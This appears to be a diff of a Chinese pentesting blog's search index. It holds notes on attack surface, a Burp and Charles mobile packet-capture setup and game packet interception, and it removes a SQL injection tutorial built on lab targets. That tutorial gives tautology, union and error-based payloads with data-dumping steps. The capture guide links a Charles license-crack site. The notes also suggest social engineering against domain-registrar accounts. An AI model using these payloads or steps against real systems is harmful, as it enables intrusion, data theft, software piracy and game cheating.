+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717103213134.png" alt="image-20240717103213134"></p>
+<p>这个其实本质上也不用我额外多说，就是类似这样的结构</p>
+<p><strong>bbs.xiaodi8.com –主网站</strong></p>
+<p><strong>bbs.xiaodi8.com:8081  –wordpress程序</strong></p>
+<h4 id="多个站点"><a href="#多个站点" class="headerlink" title="多个站点"></a>多个站点</h4><p>多个站点类的网站其实原理也比较通俗，就是通过一些子域名实现多程序的部署</p>
+<p>类似这里直接给即将部署的服务额外的域名edu.xiaodi8.com</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717103544082.png" alt="image-20240717103544082"></p>
+<p><strong>对应这两个域名解析都指向服务器IP</strong></p>
+<p><strong>给定目标是bbs.xiaodi8.com 交给你渗透，我们也就可以尝试对服务下 edu.xiaodi8.com进行安全测试。毕竟二者指向IP相同</strong></p>
+<p>这三种网络结构，也给了我们更多的可能性和更多的目标。 </p>
+<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>一般的站长，为了满足网站更多的功能亦或是让自己管理更加方便，可能都会安装一些插件，在安装插件的过程中，如果插件爆出了问题，那么也是会对网站本身造成危害。</p>
+<p>web源码插件</p>
+<p>web应用插件  类似phpmyadmin -设计是便于管理数据库的</p>
+<p>类似的使用fofa就能找到很多部署在公网上的phpmyadmin站点</p>
+<p>对应的fofa站点：<a href="fofa.so">fofa</a></p>
+<p>fofa搜索语法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717105107703.png" alt="image-20240717105107703"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112530642.png" alt="image-20240717112530642"></p>
+<p><strong>方便了管理者管理数据库，也拓展了攻击者通过这个接口攻击不支持外链数据库的可能性。</strong></p>
+<h3 id="服务器应用"><a href="#服务器应用" class="headerlink" title="服务器应用"></a>服务器应用</h3><p><strong>ftp</strong>  方便管理员进行文件传输操作，也方便攻击者攻击ftp协议服务 比如上传一些后门文件等等</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>电子功能越多，对应的可攻击点越多</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112447372.png" alt="image-20240717112447372"></p>
+<h2 id="番外安全-域名-服务器本身-服务厂商-管理人员"><a href="#番外安全-域名-服务器本身-服务厂商-管理人员" class="headerlink" title="番外安全-域名&amp;服务器本身&amp;服务厂商&amp;管理人员"></a>番外安全-域名&amp;服务器本身&amp;服务厂商&amp;管理人员</h2><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>对于一个由服务器+域名组成的服务：</p>
+<p><strong>假设</strong> </p>
+<p>如果攻击者能够得到阿里云本身的账号密码，那么登录进去就可以进行这个域名的解析管理：</p>
+<p>所以作为攻击者，如果可以收集到对应域名的注册商，对这个域名的使用人员采取社工学的信息收集（直接爆破域名注册平台风险是非常大的，同时对于这种未授权行为是由一套非常严格的管控措施的，所以请读者不要进行一些未授权的行为！如有）</p>
+<h2 id="考虑阻碍-站库分离-CDN-WAP-负载均衡-主机防护"><a href="#考虑阻碍-站库分离-CDN-WAP-负载均衡-主机防护" class="headerlink" title="考虑阻碍-站库分离&amp;CDN&amp;WAP&amp;负载均衡&amp;主机防护"></a>考虑阻碍-站库分离&amp;CDN&amp;WAP&amp;负载均衡&amp;主机防护</h2><h1 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h1>]]></content>
+      <categories>
+        <category>Penetration Testing Basic</category>
+      </categories>
+      <tags>
+        <tag>pr0gram</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WX小程序抓包&amp;游戏封包技术</title>
+    <url>/2024/07/14/%E6%89%8B%E6%9C%BA+charles+burpsuite%E9%85%8D%E5%90%88%E6%8A%93%E5%8C%85/</url>
+    <content><![CDATA[<h1 id="微信小程序-公众号抓包的主流方式"><a href="#微信小程序-公众号抓包的主流方式" class="headerlink" title="微信小程序&#x2F;公众号抓包的主流方式"></a>微信小程序&#x2F;公众号抓包的主流方式</h1><p>目前有以下几种：</p>
+<p>1、Windows+Burp+Proxifier（配置困难，数据包卡顿)</p>
+<p>2、Burp+安卓模拟器（模拟器卡顿）</p>
+<p>3、Burp+Charles（本文测试，抓包完整，放包流畅）</p>
+<p>一、下载</p>
+<h4 id="1、Charles官网下载安装包"><a href="#1、Charles官网下载安装包" class="headerlink" title="1、Charles官网下载安装包"></a>1、Charles官网下载安装包</h4><p><a href="https://www.charlesproxy.com/download/latest-release/">https://www.charlesproxy.com/download/latest-release/</a></p>
+<h4 id="2、Burpsuite下载"><a href="#2、Burpsuite下载" class="headerlink" title="2、Burpsuite下载"></a>2、Burpsuite下载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/burp/releases</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、Charles破解"><a href="#3、Charles破解" class="headerlink" title="3、Charles破解"></a>3、Charles破解</h4><p>进入链接，输入任意内容作为用户名，获取注册码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.zzzmode.com/mytools/charles/</span><br></pre></td></tr></table></figure>
+
+<p>打开Charles,打开上方工具栏中Help—Register Charles，输入用户名和激活码</p>
+<p>打开Charles,打开上方工具栏中Help—Register Charles，输入用户名和激活码</p>
+<h3 id="二、Charles设置"><a href="#二、Charles设置" class="headerlink" title="二、Charles设置"></a>二、Charles设置</h3><h4 id="1、Charles设置代理"><a href="#1、Charles设置代理" class="headerlink" title="1、Charles设置代理"></a>1、Charles设置代理</h4><p>打开工具栏中Proxy-Proxy Settings</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/d8c24248e8ee40169178ecc42a62836f.png" alt="img"></p>
+<p>设置为如下格式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/03f1ce83357c4a478a1c23b3a573ef16.png" alt="img"></p>
+<p>然后，抓取包的规则配置（*是代表抓取任意端口和域名，如果只抓取固定的端口or域名可自行设置。）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/60e3b14ad74f45e2af485fd4a1d13c00.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/f844baa2145b4ce182af424db5651b7b.png" alt="img"></p>
+<p>接下来配置Charles代理到burpsuit的规则（我这里偷懒，配置的burp默认的8080端口，为避免端口冲突，可自行想想1-65535之内的端口，与burp协同配置即可）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/57635112886a4064955e578ed29e42b4.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/ee5d8a67623a4979a5b0bbaf772dde94.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/41cb4950910e481c8ed2b31f31ed58d8.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4f367272290a44edac26e6f90f6286ea.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4fb4ca3b468a4e32a82bdf13c28f5091.png" alt="img"></p>
+<h4 id="2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）"><a href="#2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）" class="headerlink" title="2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）"></a>2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）</h4><p>因为主要是联动手机对微信抓包，所以可以关闭windows端的抓包，避免干扰。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/a9aed4740923446fbb449694c92f5a13.png" alt="img"></p>
+<h4 id="3、配置PC端证书"><a href="#3、配置PC端证书" class="headerlink" title="3、配置PC端证书"></a>3、配置PC端证书</h4><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/b5ef86e515634c1099c51d03f981eae0.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/c7f39dd9529940e59a8c97313062e2b9.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/e6604a88a8a44b6d9152d69c24520b1e.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/c7750c91696b40e9b555f08b270c0501.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/10cd0da8757444da9fd7ef640f1c2169.png" alt="img"></p>
+<p>点击下一步，再点击完成，PC显示导入完成就完成PC端证书配置了。</p>
+<h4 id="4-移动端证书配置（我这里使用苹果手机测试）"><a href="#4-移动端证书配置（我这里使用苹果手机测试）" class="headerlink" title="4.移动端证书配置（我这里使用苹果手机测试）"></a>4.移动端证书配置（我这里使用苹果手机测试）</h4><p>在这里出现了两种可能性，依次进行即可：</p>
+<h5 id="4-1手机连接电脑热点，并配置端口"><a href="#4-1手机连接电脑热点，并配置端口" class="headerlink" title="4.1手机连接电脑热点，并配置端口"></a>4.1手机连接电脑热点，并配置端口</h5><p>开启电脑热点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4c3aea78624043ee81d75414ffa5d693.png" alt="img"></p>
+<p>手机连接热点，然后在Charles中进行如下操作：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/506f55c1d8b843bfaf4eff5c4f57a0e1.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/186401f5edfa444fbb4dcea3daf5b8de.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/d754328f2a1f433a84ca9d9fd52be0f2.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/41b6e5105fac43e8a77eaf56d2d422d6.jpeg" alt="img"></p>
+<h5 id="4-2证书下载后手机能直接识别"><a href="#4-2证书下载后手机能直接识别" class="headerlink" title="4.2证书下载后手机能直接识别"></a>4.2证书下载后手机能直接识别</h5><p>在手机上使用chrome浏览器访问下面这个网址</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chls.pro/ssl</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/fcdc424fd5874c5d8af17e280e4dbff4.jpeg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/64dae3270ca34e04adbefe605f610378.jpeg" alt="img"></p>
+<p>在手机中的设置路径去设置证书：<strong>设置—&gt;通用—&gt;关于本机—&gt;证书信任设置</strong>中打开对根证书启用完全信任。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/7817da8b93ae48c2b33435669110182e.jpeg" alt="img"></p>
+<p>所有的流程配置完成，现在就可以抓包了。</p>
+<p>三、抓包<br>上面配置好了以后就可以开始抓包了，以后如果再有小程序、微信抓包需求直接进行以下流程即可。</p>
+<p>1.打开Charles.</p>
+<p>2.打开burp。on&#x2F;off拦截或者放包。</p>
+<p>3.打开电脑热点，手机连接电脑热点。（如果生活中正常使用电脑热点记得把ip代理改回自动）</p>
+<p>4.手机访问小程序或者公众号，在Charles和burp都可以看到包。</p>
+<h3 id="同样的-我们也可以在模拟器如此部署"><a href="#同样的-我们也可以在模拟器如此部署" class="headerlink" title="同样的　我们也可以在模拟器如此部署"></a>同样的　我们也可以在模拟器如此部署</h3><p><a href="https://blog.csdn.net/weixin_43910861/article/details/123851267">burp+逍遥模拟器 app抓包 （导入证书到系统的解决方案）_逍遥导入证书失败-CSDN博客</a></p>
+<h1 id="游戏封包技术"><a href="#游戏封包技术" class="headerlink" title="游戏封包技术"></a>游戏封包技术</h1><p>第一步：下载所需要的环境</p>
+<p>雷电模拟器</p>
+<p>雷电安卓模拟器-手游模拟器安卓版_android手机模拟器电脑版_雷电模拟器官网</p>
+<p>ProxyDroid</p>
+<p>链接：<a href="https://pan.baidu.com/s/1F8Yv9aDZuoN3yUgDCOVRBQ">https://pan.baidu.com/s/1F8Yv9aDZuoN3yUgDCOVRBQ</a>     提取码：s4ds </p>
+<p>CCProxy+WPE</p>
+<p>链接: <a href="https://pan.baidu.com/s/1HxVDuglgsEzXKsDZrSXS1Q">https://pan.baidu.com/s/1HxVDuglgsEzXKsDZrSXS1Q</a> 提取码: jti8 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210704231129143.png" alt="img"></p>
+<p>第二步：代理环境的配置</p>
+<p>首先adb 命令查看自己的ip 在终端输入    ipconfig ,就可以查看到自己的ip, 我这里连接的是wifi,</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222428167.png" alt="img"></p>
+<p>在雷电模拟器上打开安装好的  ProxyDroid.apk  ，将自己的电脑的 ip  填写在 HOST 里面，端口自己设置，不要超过 65535  ，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/fde7482c47e14fecaf60d1662b38aa16.png" alt="img"></p>
+<p> 设置好 之后  再将上面 这个开关打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/2ecd9200873346db9206fdb169b8981b.png" alt="img"></p>
+<p>然后 在pc 端打开 CCProxy, 打开设置，端口  是 上面 app  里面填写的端口，IP 和代理app 的保持一直 都是自己电脑上的ip 。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222522362.png" alt="img"></p>
+<p>在点击下面的   高级   ，把ip改成和自己电脑的一至，再点击确定。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222527721.png" alt="img"></p>
+<p>ccproxy 还要开启账户里面的允许所有。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210704230543369.png" alt="img"></p>
+<p>我们再打开模拟器上的游戏，看到ccp 中有这样一条线，就能看到代理成功。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222548577.png" alt="img"></p>
+<p>接下来我们就打开 ，WPE , 在目标程序中找到ccp 的进程。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222608143.png" alt="img"></p>
+<p>在视图里面可以设置 拦截发送的数据包，还是接受到的数据包，我这里只拦截发送的数据包。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/2021060522262510.png" alt="img"></p>
+<p>设置好之后，我们进入游戏，找到游戏的中角色的升级，我们打开wpe, 点击 黑色的运行按钮，我们就能看到扇形的数据包中开始变化，点击一次升级，我们就暂停拦截，我们就取分析，拦截到的数据包，在如下的列表中我们可以很快浏览一下，我们 找到规律了，  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222656425.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222711573.png" alt="img"></p>
+<p>总结： 我们设置的ip: 172.20.4.153  我们现在就查看，只要来源和目标 ip 都是一样的。这就说明是本地和本地的发送，我们就将这些直接过滤掉， 我们剩下的也不多，就一个一个的试试，</p>
+]]></content>
+      <categories>
+        <category>Penetration Testing Basic</category>
+      </categories>
+      <tags>
+        <tag>pr0gram</tag>
       </tags>
   </entry>
   <entry>
@@ -940,577 +1609,6 @@
       </categories>
       <tags>
         <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入 二开desu</title>
-    <url>/2024/07/08/SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="SQL注入二开"><a href="#SQL注入二开" class="headerlink" title="SQL注入二开"></a>SQL注入二开</h1><p>本教程基于SQL i-Labs,pikachu,dvwa等靶场做拓展</p>
-<h1 id="基本原理和概念简介"><a href="#基本原理和概念简介" class="headerlink" title="基本原理和概念简介"></a>基本原理和概念简介</h1><p>SQL注入是黑客攻击最常见的方法，SQL注入作为OWASP中四大Web应用程序十大安全漏洞之一，也可以被一些没有太多网络安全技术“脚本小子”利用，因此掌握SQL注入原理和预防机制非常重要</p>
-<h1 id="HOW-to-build-SQLI-Lab"><a href="#HOW-to-build-SQLI-Lab" class="headerlink" title="HOW to build SQLI-Lab"></a>HOW to build SQLI-Lab</h1><h3 id="简单的部署"><a href="#简单的部署" class="headerlink" title="简单的部署"></a>简单的部署</h3><p>图方便的话 直接通过Docker部署就可以了</p>
-<p>也可以部署在Web应用系统平台，</p>
-<h3 id="从０开始部署"><a href="#从０开始部署" class="headerlink" title="从０开始部署"></a>从０开始部署</h3><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708172147084.png" alt="image-20240708172147084"></p>
-<h3 id="Web应用程序系统"><a href="#Web应用程序系统" class="headerlink" title="Web应用程序系统"></a>Web应用程序系统</h3><p>Web应用程序系统的总体体系结构如图一所示</p>
-<p>客户端是浏览器，服务端通常包括了Web服务器，数据库服务器和高级语言解释器，典型的Web服务器架构包括</p>
-<p>Apache+PHP+MySQL</p>
-<p>IIS＋ASP+MYSQL等</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708171810391.png" alt="image-20240708171810391"></p>
-<h1 id="HOW-does-it-form-–SQL-INJECTION"><a href="#HOW-does-it-form-–SQL-INJECTION" class="headerlink" title="HOW does it form –SQL INJECTION"></a>HOW does it form –SQL INJECTION</h1><p>SQL注入本质是攻击者在Web表单或者URL中插入SQL命令或者片段到查询字符串中,当Web服务器没有严格验证输入和传递字符串的有效性时,攻击者就可以达到<strong>欺骗数据库服务器</strong>,执行恶意SQL命令的效果</p>
-<p>在此之前还要了解一个概念**’隐式转换’**</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708173609585.png" alt="image-20240708173609585"></p>
-<h1 id="SQL-INJECTION-LIST"><a href="#SQL-INJECTION-LIST" class="headerlink" title="SQL INJECTION LIST"></a>SQL INJECTION LIST</h1><p>包括了</p>
-<p>同义SQL注入,联合注入,基于报错的注入,盲注.</p>
-<h4 id="Tautologic-SQL注入-真理SQL"><a href="#Tautologic-SQL注入-真理SQL" class="headerlink" title="Tautologic SQL注入(真理SQL)"></a>Tautologic SQL注入(真理SQL)</h4><p>这是一种简单的攻击方法,在系统原SQL命令中插入了一个tautologic(常为正确的)条件子句,使原SQL语句的条件限定不起作用.</p>
-<h4 id="联合SQL注入"><a href="#联合SQL注入" class="headerlink" title="联合SQL注入"></a>联合SQL注入</h4><p>本质上利用了SQL命令中的联合查询,从而可以执行插入的查询,从特定的数据表中窃取信息</p>
-<p>建议在此之前 先学会基本的SQL注入的增删改查,并清除SQL库表的结构如何</p>
-<h4 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h4><p>攻击者将格式错误的SQL命令作为攻击负载使系统返回一些报错,从而使系统返回一些过度暗示的信息</p>
-<p>比如说Order by 1—–n(列溢出报错)</p>
-<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>对于盲注攻击,攻击者会构造一些SQL查询条件,系统对这些查询条件的不同状态会有不同响应,进而获得系统的内部信息</p>
-<h1 id="SQL-injection-Begin"><a href="#SQL-injection-Begin" class="headerlink" title="SQL injection Begin"></a>SQL injection Begin</h1><h2 id="数字型—最基本的检验"><a href="#数字型—最基本的检验" class="headerlink" title="数字型—最基本的检验"></a>数字型—最基本的检验</h2><p>数字型可以检验程序本身是否有对用户的输入做任何的额外处理</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------------------测试步骤-----------------------</span><br><span class="line">1.加单引号</span><br><span class="line">URL:www.text.com/text.php?id=1&#x27;]</span><br><span class="line">对应数据服务器响应的SQL命令：</span><br><span class="line">select * from table where id =1&#x27;</span><br><span class="line">这时SQL语句出错，程序无法从数据库中查询出数据，此时可以判断出大概率存在注入，因为只有服务器将对应的单引号一起当作SQL语句执行了才会出现报错，但这也并不绝对，也有可能是程序本身的问题</span><br><span class="line">2.加 and 1=1</span><br><span class="line">URL：www.text.com/text.php?id=1 and 1=1</span><br><span class="line">对应数据服务器响应的SQL命令：</span><br><span class="line">select * from table where id =1 and 1=1</span><br><span class="line">这时语句执行一定是正常的，因为加入了tautologic式的条件子句</span><br><span class="line">3.加 and 1=2</span><br><span class="line">URL：www.text.com/text.php?id=1 and 1=2</span><br><span class="line">对应数据服务器响应的SQL命令</span><br><span class="line">select * from table where id =1 and 1=2</span><br><span class="line">这时语句可以正常执行但无法查询出任何结构，返回数据与原始网页会存在一定的差异</span><br></pre></td></tr></table></figure>
-
-<p>如果这三个payload传入过后同上述代码块中提出的响应是一致的，那么程序本身就是并没有对用户的输入做任何额外处理的，则可以判断该URL存在数字型注入</p>
-<h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>当传入的参数类型为字符串时，若存在漏洞则称为字符型漏洞，字符型和数字型最大的一个区别在于数字型不需要单引号来闭合而字符串一般需要单引号来闭合对应传入的参数</p>
-<p>字符型语句如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where id = ‘admin’</span><br></pre></td></tr></table></figure>
-
-<p>因此在构造payload时通过闭合单引号可以成功执行语句</p>
-<p>比方</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708200640557.png" alt="image-20240708200640557"></p>
-<p>–为什么要这么做</p>
-<p>首先服务端要求我们传入的参数是字符型 在传入的过程中需要将我们自己的恶意指令注入就需要首先满足隐式转换的条件–即先让它接收到需要的字符型变量，然后再通过一些条件子句代入我们自己的语句</p>
-<p>也就是说 我们可以这么做</p>
-<p>原本的查询语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where name =&#x27;（用户输入点）&#x27;+后续语句</span><br></pre></td></tr></table></figure>
-
-<p>这个时候我们在输入点输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
-
-<p>那么可以如此合成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where name =&#x27; 1&#x27; or 1=1 #&#x27;+后续语句</span><br></pre></td></tr></table></figure>
-
-<p>可以发现不但闭合了前面的语句，同时通过条件语句插入了攻击者的语句，并注释（使无效化）后面可能会出现的另外一些条件语句。</p>
-<p>可以用一句话很优雅的总结数字型和字符型</p>
-<p>​                              <strong>—猎人往往以猎物的方式出现—</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708201225404.png" alt="image-20240708201225404"></p>
-<h2 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h2><p>联合查询可以一句SQL语句中执行多个查询任务，把查询任务从一个表追加到另外一个表，使用UNION或者UNION　ALL来实现</p>
-<p>UNION ALL和UNION的区别是UNION ALL操作符可以查询重复的值</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708202413083.png" alt="image-20240708202413083"></p>
-<p>使用UNION注入也是有前提条件的,Union all左右两边查询的列数必须一致</p>
-<p>以上图为例</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> user_id,first_name <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> user_id,first_name,last_name <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>这个时候你可以发现,union all操作符前的sql语句查询了users表中user_id&#x3D;1所对应的user_id列和first_name.而在union操作符后的sql语句则不同,其对应多查询了一个last_name参数，这个时候查询语句不成立。</p>
-<h3 id="怎么确定字段数"><a href="#怎么确定字段数" class="headerlink" title="怎么确定字段数"></a>怎么确定字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># by2时回显正常</span><br><span class="line">order by 2#</span><br><span class="line"># by3时回显异常</span><br><span class="line">order by 3#</span><br></pre></td></tr></table></figure>
-
-<p>思考：<br>1.为什么用order by 可以证明前面语句查询了三列数据呢？<br>2.我们为什么要知道前面查询了多少语句呢？<br>解：<br>第一题：<br>首先我们要知道order by的作用：order by 简单的来说 就是对前面查询的数据进行分组，分组依据是前面查询的内容的属性。比如说前面查询的数据是甲、乙、丙，我们可以根据这三种属性的一到三种进行分类，但是不能超过三种。所以上面order by 4 会报错误信息。因此可以依据此来判断前面查询了几列数据。<br>第二题：<br>因为使用union函数进行查询时，union前面查询语句查询的元素与后面查询语句查询的元素要数量上一样，所以我们必需要知道前面语句查询了多少个元素。比如，此语句：select 甲,乙,丙 union select 1,2,3 因为前面查询的语句有三个元素（甲，乙，丙），所以后面查询的语句必须是三个元素（1，2，3）。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709100240768.png" alt="image-20240709100240768"></p>
-<p>类似上图所说的 我们就可以通过联合查询得到一些关键性的信息</p>
-<p>这里我们也可以介绍一个比较重要的知识点，在MYSQL５.０以上版本，存在一个自带的数据库:information_schema(重点)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709101446333.png" alt="image-20240709101446333"></p>
-<p>information_schema数据库中还要三个表非常重要：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHEMATA:　表里包含所有数据库的名字</span><br><span class="line">TABLES：　　表里包含所有数据库的所有表</span><br><span class="line">COLUMNS：　　表里包含所有数据库的所有表的所有字段</span><br></pre></td></tr></table></figure>
-
-<p>联合注入的过程:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">１.判断是否存在注入，注入是字符型还是整数型</span><br><span class="line">２.猜解SQL查询语句中的字段数（ｏｒｄｅｒ　ｂｙ）</span><br><span class="line">３.确定显示位</span><br><span class="line">４.获取当前数据库（爆库</span><br><span class="line">５.获取数据库中的表（爆表</span><br><span class="line">６.获取表中的字段名（爆字段</span><br><span class="line">７.下载数据（爆数据</span><br><span class="line">这里以Pikachu联系平台为例</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709110242890.png" alt="image-20240709110242890"></p>
-<p>这里截取一个基本的流程 以DVWA靶场为例</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709110813626.png" alt="image-20240709110813626"></p>
-<p>一般爆出的密码是经过一层加密的,这个时候可以利用在线工具对应解码爆出真实的密码</p>
-<p>这里附上在线工具</p>
-<p><a href="https://cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入顾名思义主要是利用数据库报错来进行判断是否存在注入点，如果不符合数据库语法规则就会 报错并返回错误信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的特殊字符：&#x27; \ ; %00 ) ( # &quot;</span><br></pre></td></tr></table></figure>
-
-<p>在MySQL高版本中添加了对XML文档进行查询和修改的函数,这两个函数常用于报错注入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue()</span><br><span class="line">updatexml()</span><br></pre></td></tr></table></figure>
-
-<p>原因:当这两个函数在执行时,如果出现XML文档路径错误就会产生报错.</p>
-<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><ul>
-<li>此函数从目标XML中返回包含所查询值的字符串,语法:extractvalue(XML_document,xpath_string)</li>
-</ul>
-<p>第一个参数:</p>
-<p>string格式,即XNL文档对象名称</p>
-<p>第二个参数:Xpath_string(Xpath形式的字符串,为XML文档的路径)</p>
-<p>extractvalue使用时若Xpath_string格式出错,mysql数据库服务器是会爆出错误的,<strong>对应的报错也会很明显的给我们指出错误类型为xpath语法错误</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709151441863.png" alt="image-20240709151441863"></p>
-<p>extractvalue原本是用于从documentr返回包含string的字符串,那么string参数不符合xpath的语法就会爆出错误,将查询结果同步放在信息里.<strong>这本质上也是利用了该函数报错的危险特性,将我们想要查询的结果以非xpath语法格式强行放入该函数,”勒令”它帮我们查询需要的信息</strong></p>
-<h4 id="这里突然插入-SQL注入的基本思路"><a href="#这里突然插入-SQL注入的基本思路" class="headerlink" title="-这里突然插入  SQL注入的基本思路-"></a>-这里突然插入  SQL注入的基本思路-</h4><p>SQL注入本质上其实也都明白了,就是利用现成的服务端给我们预留的查询语句进而实现从无关紧要的信息越位到更为重要更为核心的信息</p>
-<p><strong>那么首先我们要搞懂的就是该如何利用这条服务端留给我们的现成的语句了</strong></p>
-<p>其实道理很简单:</p>
-<p>一,先搞清楚服务端目前供给我们来查询的是什么</p>
